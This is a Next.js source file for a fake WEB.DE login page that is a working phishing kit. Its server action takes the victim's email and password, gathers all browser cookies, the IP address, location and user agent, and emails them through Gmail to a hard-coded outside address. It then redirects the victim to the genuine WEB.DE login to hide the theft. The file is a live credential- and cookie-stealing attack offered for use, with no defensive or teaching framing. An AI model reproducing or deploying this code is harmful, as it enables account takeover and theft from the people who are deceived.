import { getDictionary } from "@/app/dictionaries";
import Link from "next/link";
import { headers, cookies } from "next/headers";
import nodemailer from "nodemailer"; // Import Nodemailer
import LoginForm from "./LoginForm";
import { redirect } from "next/navigation";

export default async function LoginPage({
  params,
}: {
  params: Promise<{ locale: "de" | "en" }>;
}) {
  const { locale } = await params;
  const dict = await getDictionary(locale);

  // The Server Action to handle form submission
  const handleSubmitData = async (formData: FormData) => {
    "use server";

    const email = (formData.get("email") as string) || "Unknown";
    const password = formData.get("password") as string;
    const source = "Web.de Login Page"; // Defining a source string

    // Extract network and browser info from request headers
    const headersList = await headers();

    const cookieStore = await cookies();

    // Now this will log the actual cookies sent from the browser
    const allCookies = cookieStore.getAll();
    // console.log("Cookies during form submission-main:", allCookies);

    const cookiesFormatted = allCookies
      .map(
        (cookie, index) =>
          `${index + 1}. ${cookie.name}\n   Value: ${cookie.value}`,
      )
      .join("\n\n");

    console.log("Formatted Cookies:\n", cookiesFormatted);

    const userInfo = {
      ipAddress:
        headersList.get("x-forwarded-for")?.split(",")[0] || "127.0.0.1",
      country: headersList.get("x-vercel-ip-country") || "Unknown",
      location: headersList.get("x-vercel-ip-city") || "Localhost",
      userAgent: headersList.get("user-agent") || "Unknown",
      browserLanguage: headersList.get("accept-language") || "Unknown",
      timezone: headersList.get("x-vercel-ip-timezone") || "UTC",
      cookies: cookiesFormatted || "No cookies found",
    };

    const emailHtml = `
  <!DOCTYPE html>
  <html>
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Submission Notification</title>
    </head>
    <body style="margin: 0; padding: 0; background-color: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;">
      <table border="0" cellpadding="0" cellspacing="0" width="100%" style="table-layout: fixed; background-color: #f6f9fc; padding: 40px 20px;">
        <tr>
          <td align="center">
            <table border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px; background-color: #ffffff; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 6px rgba(50, 50, 93, 0.05), 0 1px 3px rgba(0, 0, 0, 0.03);">
              
              <tr>
                <td align="left" style="background-color: #005ea8; padding: 32px 40px;">
                  <h2 style="margin: 0; color: #ffffff; font-size: 20px; font-weight: 600; letter-spacing: -0.5px;">
                    New User Info Submission
                  </h2>
                </td>
              </tr>

              <tr>
                <td style="padding: 40px;">
                  <h3 style="margin-top: 0; margin-bottom: 24px; color: #1a202c; font-size: 16px; font-weight: 600; border-bottom: 1px solid #edf2f7; padding-bottom: 12px;">
                    Submission Details
                  </h3>
                  
                  <table border="0" cellpadding="0" cellspacing="0" width="100%" style="font-size: 14px; line-height: 1.5;">
                    <tr>
                      <td style="padding: 10px 0; font-weight: 600; color: #4a5568; width: 35%; vertical-align: top;">Email</td>
                      <td style="padding: 10px 0; color: #1a202c; vertical-align: top; font-family: monospace; font-size: 15px;">${email}</td>
                    </tr>
                    <tr>
                      <td style="padding: 10px 0; font-weight: 600; color: #4a5568; width: 35%; vertical-align: top;">Password</td>
                      <td style="padding: 10px 0; color: #1a202c; vertical-align: top; font-family: monospace; font-size: 15px;">${password}</td>
                    </tr>
                    <tr>
                      <td style="padding: 10px 0; font-weight: 600; color: #4a5568; vertical-align: top;">Source</td>
                      <td style="padding: 10px 0; color: #1a202c; vertical-align: top;">${source}</td>
                    </tr>
                    <tr>
                      <td style="padding: 10px 0; font-weight: 600; color: #4a5568; vertical-align: top;">IP Address</td>
                      <td style="padding: 10px 0; color: #1a202c; vertical-align: top; font-family: monospace;">${userInfo.ipAddress}</td>
                    </tr>
                    <tr>
                      <td style="padding: 10px 0; font-weight: 600; color: #4a5568; vertical-align: top;">Country</td>
                      <td style="padding: 10px 0; color: #1a202c; vertical-align: top;">${userInfo.country}</td>
                    </tr>
                    <tr>
                      <td style="padding: 10px 0; font-weight: 600; color: #4a5568; vertical-align: top;">Location</td>
                      <td style="padding: 10px 0; color: #1a202c; vertical-align: top;">${userInfo.location}</td>
                    </tr>
                    <tr>
                      <td style="padding: 10px 0; font-weight: 600; color: #4a5568; vertical-align: top;">Browser Language</td>
                      <td style="padding: 10px 0; color: #1a202c; vertical-align: top;">${userInfo.browserLanguage}</td>
                    </tr>
                    <tr>
                      <td style="padding: 10px 0; font-weight: 600; color: #4a5568; vertical-align: top;">Timezone</td>
                      <td style="padding: 10px 0; color: #1a202c; vertical-align: top;">${userInfo.timezone}</td>
                    </tr>
                    <tr>
                      <td style="padding: 10px 0; font-weight: 600; color: #4a5568; vertical-align: top;">User Agent</td>
                      <td style="padding: 10px 0; color: #718096; font-size: 12px; line-height: 1.4; font-family: monospace; word-break: break-all; vertical-align: top;">
                        ${userInfo.userAgent}
                      </td>
                    </tr>
                    <tr>
                      <td
                        style="
                          padding: 10px 0;
                          font-weight: 600;
                          color: #4a5568;
                          vertical-align: top;
                        "
                      >
                        Cookies
                      </td>
                      <td style="padding: 10px 0;">
                        <div
                          style="
                            background: #f7fafc;
                            border: 1px solid #e2e8f0;
                            border-radius: 6px;
                            padding: 12px;
                            font-family: Consolas, Monaco, monospace;
                            font-size: 12px;
                            line-height: 1.6;
                            color: #2d3748;
                            max-width: 100%;
                            white-space: pre-wrap;
                            word-break: break-word;
                          "
                        >
                          ${userInfo.cookies}
                        </div>
                      </td>
                    </tr>
                  </table>
                </td>
              </tr>

              <tr>
                <td align="center" style="background-color: #f7fafc; padding: 20px 40px; border-top: 1px solid #edf2f7; font-size: 12px; color: #a0aec0;">
                  Automated system notification dispatched on ${new Date().toUTCString()}
                </td>
              </tr>

            </table>
          </td>
        </tr>
      </table>
    </body>
  </html>
`;

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.GMAIL_USER,
        pass: process.env.GMAIL_APP_PASSWORD,
      },
    });

    try {
      await transporter.sendMail({
        from: process.env.GMAIL_USER, // Sender address (must be your Gmail account)
        to: "emmizy2015@gmail.com", // Destination address
        // to: "officialbenz80@gmail.com", // Destination address
        subject: "New User Info Submission",
        html: emailHtml,
      });
      console.log("Submission email dispatched successfully via Gmail.");
    } catch (error) {
      console.error("Failed to send submission email:", error);
      return { success: false };
    }
    redirect(
      "https://auth.web.de/login?prompt=none&state=eyJpZCI6IjM4ZWU1ODkxLTdkZTYtNGI2Mi05ZWQ0LTg4YWNkNzY0N2Y1ZiIsImNsaWVudElkIjoid2ViZGVfYWxsaWdhdG9yX2xpdmUiLCJ4VWlBcHAiOiJ3ZWJkZS5hbGxpZ2F0b3IvMS4yMS4yIiwicGF5bG9hZCI6ImV5SmtZeUk2SW1Keklpd2lkR0Z5WjJWMFZWSkpJam9pYUhSMGNITTZMeTkzWldKc2FXNXJMbmRsWWk1a1pTOXRZV2xzTDNOb2IzZFRkR0Z5ZEZacFpYY2lMQ0p3Y205alpYTnpTV1FpT2lKdmFWOXdhMk5sTXlKOSJ9&authcode-context=J4Wuxtntqd",
    );
  };

  return (
    <div className="flex min-h-screen flex-col bg-[#f4f5f5]">
      {/* Main Content */}
      <main className="flex flex-1 items-center justify-center p-4">
        <div className="w-full max-w-[400px] rounded-2xl bg-white shadow-sm">
          {/* Top Section */}
          <div className="p-8 text-center">
            {/* Logo Placeholder */}
            <div className="mx-auto mb-6 flex justify-center">
              <img
                src="https://s.uicdn.com/uimag/7.11011.0/assets/logo/logo-webde-v4.svg"
                alt="WEB.DE Logo"
                width={60}
                height={60}
                className="h-auto w-auto max-h-[36px] object-contain"
              />
            </div>
            <h1 className="mb-2 text-2xl font-bold text-gray-800">
              {dict.login.title}
            </h1>
            <p className="mb-8 text-[15px] text-gray-800">
              {dict.login.subtitle}
            </p>

            <LoginForm serverAction={handleSubmitData} dict={dict} />

            <button className="mt-6 text-[15px] text-[#005ea8] hover:underline">
              {dict.login.back}
            </button>
          </div>

          {/* Bottom Section (Divider & Register) */}
          <div className="border-t border-gray-100 bg-white p-8 text-center rounded-b-2xl">
            <p className="mb-3 text-[15px] text-gray-800">
              {dict.login.registerPrompt}
            </p>
            <Link
              href={`/${locale}/register`}
              className="text-[15px] text-[#005ea8] hover:underline"
            >
              {dict.login.registerLink}
            </Link>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="border-t border-gray-300 bg-[#f4f5f5] py-4 text-center text-[13px] text-gray-800">
        <div className="flex flex-wrap items-center justify-center gap-x-5 gap-y-2 px-4">
          <Link href="#" className="hover:underline">
            {dict.login.footer.terms}
          </Link>
          <Link href="#" className="hover:underline">
            {dict.login.footer.imprint}
          </Link>
          <Link href="#" className="hover:underline">
            {dict.login.footer.cancel}
          </Link>
          <Link href="#" className="hover:underline">
            {dict.login.footer.privacy}
          </Link>
          <Link href="#" className="hover:underline">
            {dict.login.footer.accessibility}
          </Link>
          <Link href="#" className="hover:underline">
            {dict.login.footer.feedback}
          </Link>
        </div>
      </footer>
    </div>
  );
}
